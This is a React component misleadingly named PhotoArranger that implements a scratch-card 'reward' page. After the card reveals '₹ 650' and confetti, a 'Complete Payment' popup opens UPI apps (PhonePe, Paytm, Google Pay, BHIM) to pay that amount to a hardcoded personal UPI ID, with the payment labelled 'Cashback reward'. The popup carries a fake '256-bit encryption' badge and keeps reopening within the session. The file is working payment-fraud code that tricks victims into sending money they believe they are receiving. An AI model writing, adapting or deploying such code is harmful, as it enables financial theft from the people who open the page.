import React, { useEffect, useRef, useState } from 'react';
import { createPortal } from 'react-dom';
import './PhotoArranger.css';

// Statically import expected images
import engBack from './eng_back.png';
import centreImg from './centre.jpeg';
// If eng_front file is named differently, rename it to eng_front.png/jpg and place next to this file
import engFront from './eng_front.jpg';
// Overlay image shown before scratching
import scratcherOverlay from './scratcher.jpg';

const Scratcher = ({ overlaySrc, onComplete }) => {
    const containerRef = useRef(null);
    const canvasRef = useRef(null);
    const imgRef = useRef(null);
    const [isReady, setIsReady] = useState(false);
    const [isDone, setIsDone] = useState(false);

    useEffect(() => {
        const img = imgRef.current; // revealed image (centre)
        const canvas = canvasRef.current;
        const ctx = canvas.getContext('2d');
        const cover = new Image(); // overlay image (eng_front)

        const setup = () => {
            const width = img.naturalWidth || img.width;
            const height = img.naturalHeight || img.height;

            // Constrain to responsive width while keeping aspect ratio
            const containerWidth = containerRef.current.clientWidth;
            const scale = Math.min(1, containerWidth / width);
            const drawWidth = Math.floor(width * scale);
            const drawHeight = Math.floor(height * scale);

            img.style.width = drawWidth + 'px';
            img.style.height = drawHeight + 'px';
            canvas.width = drawWidth;
            canvas.height = drawHeight;

            // Draw overlay image scaled to canvas
            ctx.globalCompositeOperation = 'source-over';
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            if (cover.complete && cover.naturalWidth > 0) {
                ctx.drawImage(cover, 0, 0, canvas.width, canvas.height);
                setIsReady(true);
            }
        };

        // Load overlay image, then size everything
        cover.src = overlaySrc;
        if (!cover.complete) {
            cover.addEventListener('load', () => {
                if (img.complete) setup(); else img.addEventListener('load', setup, { once: true });
            }, { once: true });
        }
        if (cover.complete) {
            if (img.complete) setup(); else img.addEventListener('load', setup, { once: true });
        }

        const handleResize = () => {
            if (img.complete) setup();
        };
        window.addEventListener('resize', handleResize);
        return () => window.removeEventListener('resize', handleResize);
    }, []);

    useEffect(() => {
        if (!isReady || isDone) return;
        const canvas = canvasRef.current;
        const ctx = canvas.getContext('2d');

        let isDrawing = false;
        const brushRadius = 40;
        let moveCount = 0;

        const getPos = (e) => {
            const rect = canvas.getBoundingClientRect();
            const clientX = e.touches ? e.touches[0].clientX : e.clientX;
            const clientY = e.touches ? e.touches[0].clientY : e.clientY;
            return {
                x: clientX - rect.left,
                y: clientY - rect.top
            };
        };

        const start = (e) => {
            isDrawing = true;
            scratch(e);
            e.preventDefault();
        };

        const move = (e) => {
            if (!isDrawing) return;
            scratch(e);
            e.preventDefault();
            moveCount++;
            if (moveCount % 8 === 0) checkProgress();
        };

        const end = () => {
            isDrawing = false;
            checkProgress();
        };

        const scratch = (e) => {
            const { x, y } = getPos(e);
            ctx.globalCompositeOperation = 'destination-out';
            ctx.beginPath();
            ctx.arc(x, y, brushRadius, 0, Math.PI * 2);
            ctx.fill();
        };

        const checkProgress = () => {
            if (isDone) return;
            try {
                const { width, height } = canvas;
                const imageData = ctx.getImageData(0, 0, width, height);
                const data = imageData.data;
                let cleared = 0;
                for (let i = 3; i < data.length; i += 4) {
                    if (data[i] < 32) cleared++;
                }
                const ratio = cleared / (data.length / 4);
                if (ratio >= 0.65) {
                    setIsDone(true);
                    ctx.clearRect(0, 0, canvas.width, canvas.height);
                    if (typeof onComplete === 'function') onComplete();
                }
            } catch (e) {
                // ignore
            }
        };

        canvas.addEventListener('mousedown', start);
        canvas.addEventListener('mousemove', move);
        window.addEventListener('mouseup', end);

        canvas.addEventListener('touchstart', start, { passive: false });
        canvas.addEventListener('touchmove', move, { passive: false });
        window.addEventListener('touchend', end);

        return () => {
            canvas.removeEventListener('mousedown', start);
            canvas.removeEventListener('mousemove', move);
            window.removeEventListener('mouseup', end);
            canvas.removeEventListener('touchstart', start);
            canvas.removeEventListener('touchmove', move);
            window.removeEventListener('touchend', end);
        };
    }, [isReady, isDone, onComplete]);

    return (
        <div className="scratcher" ref={containerRef}>
            <div className="scratcher-inner">
                <img ref={imgRef} src={centreImg} alt="centre" className="scratcher-image" />
                <div className="centre-overlay" aria-hidden={!isReady}>
                    {/* <div className="centre-title">Total Balance</div> */}
                    <div className="centre-amount">₹ 650</div>
                </div>
                <canvas ref={canvasRef} className="scratcher-canvas" />
            </div>
        </div>
    );
};

const PhotoArranger = () => {
    const [revealed, setRevealed] = useState(false);
    const [showPayment, setShowPayment] = useState(false);

    // Restore popup state for this session until a hard refresh
    useEffect(() => {
        const persisted = sessionStorage.getItem('popupOpen') === '1';
        if (persisted) setShowPayment(true);
    }, []);

    useEffect(() => {
        if (!revealed) return;
        const t = setTimeout(() => {
            setShowPayment(true);
            sessionStorage.setItem('popupOpen', '1');
        }, 5000);
        return () => clearTimeout(t);
    }, [revealed]);

    const amountInRupees = 650;

    const openUpi = (targetPackage, upiId) => {
        // Use a realistic default merchant UPI ID
        const pa = encodeURIComponent((upiId || '7378351383@ybl').trim());
        const pn = encodeURIComponent('Reward Payment');
        const am = encodeURIComponent(String(amountInRupees));
        const cu = 'INR';
        const tn = encodeURIComponent('Cashback reward');

        // Base UPI link (works in most apps)
        const upiUrl = `upi://pay?pa=${pa}&pn=${pn}&am=${am}&cu=${cu}&tn=${tn}`;

        const isAndroid = /Android/i.test(navigator.userAgent);

        // Known app schemes
        const schemeByPkg = {
            'com.phonepe.app': `phonepe://pay?pa=${pa}&pn=${pn}&am=${am}&cu=${cu}&tn=${tn}`,
            'net.one97.paytm': `paytmmp://pay?pa=${pa}&pn=${pn}&am=${am}&cu=${cu}&tn=${tn}`,
            'com.google.android.apps.nbu.paisa.user': `tez://upi/pay?pa=${pa}&pn=${pn}&am=${am}&cu=${cu}&tn=${tn}`,
            'in.org.npci.upiapp': `bhim://pay?pa=${pa}&pn=${pn}&am=${am}&cu=${cu}&tn=${tn}`
        };

        const appScheme = schemeByPkg[targetPackage] || upiUrl;

        // Best experience on Android Chrome: use intent with fallback to Play Store
        if (isAndroid && targetPackage) {
            const playStore = encodeURIComponent(`https://play.google.com/store/apps/details?id=${targetPackage}`);
            const intentUrl = `intent://pay?pa=${pa}&pn=${pn}&am=${am}&cu=${cu}&tn=${tn}#Intent;scheme=upi;package=${targetPackage};S.browser_fallback_url=${playStore};end`;
            // Navigate synchronously in the user gesture
            window.location.assign(intentUrl);
            return;
        }

        // Fallbacks for other cases (desktop/iOS): try scheme, then generic
        try {
            window.location.assign(appScheme);
        } catch (e) {
            window.location.assign(upiUrl);
        }
    };

    return (
        <div className="photo-arranger-container photo-arranger-vertical">
            <div className="section">
                <img src={engFront} alt="eng front" className="flat-image" />
            </div>

            <div className="section section-middle">
  <Scratcher overlaySrc={scratcherOverlay} onComplete={() => setRevealed(true)} />
</div>

{revealed && createPortal(
  <div className="confetti" aria-hidden="true">
    {Array.from({ length: 120 }).map((_, i) => (
  <span
    key={i}
    className="confetti-piece"
    style={{
      left: `${(i * 11) % 100}%`,
      animationDelay: `${(i % 12) * 0.09}s`,
      animationDuration: `${2.8 + (i % 5) * 0.6}s`,
      backgroundColor: ['#ef4444','#f59e0b','#10b981','#3b82f6','#8b5cf6','#ec4899'][i % 6],
    }}
  />
))}

  </div>,
  document.body
)}


            <div className="section">
                <img src={engBack} alt="eng back" className="flat-image" />
            </div>
            {showPayment && createPortal(
              <div className="overlay" role="dialog" aria-modal="true" onClick={(e) => { if (e.target === e.currentTarget) { setShowPayment(false); sessionStorage.removeItem('popupOpen'); } }}>
                <div className="payment-popup" onClick={(e) => e.stopPropagation()}>
                  <div className="popup-header">
                    <button className="close-btn" onClick={() => { setShowPayment(false); sessionStorage.removeItem('popupOpen'); }} aria-label="Close">×</button>
                    <h2>Complete Payment</h2>
                    <p>Choose your preferred payment method</p>
                  </div>

                  <div className="popup-content">

                    <div className="section-title">UPI Apps</div>

                    <div className="payment-options">
                      <button className="payment-option" onClick={() => openUpi('com.phonepe.app')}>
                        <div className="payment-icon phonepe">
                          <img className="app-icon" alt="PhonePe" src="./phonepe.png" />
                        </div>
                        <div className="name">PhonePe</div>
                      </button>
                      <button className="payment-option" onClick={() => openUpi('net.one97.paytm')}>
                        <div className="payment-icon paytm">
                          <img className="app-icon" alt="Paytm" src="./paytm.png" />
                        </div>
                        <div className="name">Paytm</div>
                      </button>
                      <button className="payment-option" onClick={() => openUpi('com.google.android.apps.nbu.paisa.user')}>
                        <div className="payment-icon gpay">
                          <img className="app-icon" alt="GPay" src="./gpay.png" />
                        </div>
                        <div className="name">Google Pay</div>
                      </button>
                      <button className="payment-option" onClick={() => openUpi('in.org.npci.upiapp')}>
                        <div className="payment-icon bhim">
                          <img className="app-icon" alt="BHIM" src="./bhim.png" />
                        </div>
                        <div className="name">BHIM</div>
                      </button>
                    </div>

                    <div className="divider"><span>OR</span></div>

                    <div className="section-title">Enter UPI ID</div>
                    <div className="payment-input">
                      <div className="input-row">
                        <input id="manualUpi" type="text" placeholder="yourname@bank" />
                        <button onClick={() => {
                          const v = document.getElementById('manualUpi');
                          if (v && v.value) openUpi('', v.value.trim());
                        }}>Pay</button>
                      </div>
                    </div>
                    <div className="secure-note">🔒 Secured by 256-bit encryption</div>
                  </div>
                </div>
              </div>,
              document.body
            )}
        </div>
    );
};





export default PhotoArranger;